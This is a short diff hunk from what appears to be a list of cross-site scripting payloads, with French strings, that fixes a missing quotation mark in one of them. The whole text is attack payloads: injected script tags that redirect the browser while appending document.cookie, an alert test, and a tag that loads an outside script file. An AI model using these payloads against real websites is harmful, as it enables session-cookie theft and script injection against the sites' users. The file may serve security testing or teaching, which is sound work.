@@ -7,7 +7,7 @@ pseudo="><b>coucou</b><script>location.replace("c_authentification.php?cookie="+
 ><script>location.replace("c_authentification.php?cookie="+document.cookie);</script><foo="
 
 
-><script>alert("Hacked !!!);</script><foo="
+><script>alert("Hacked !!!");</script><foo="
 
 viandes><script src="can-script.js"></script><foo="
 
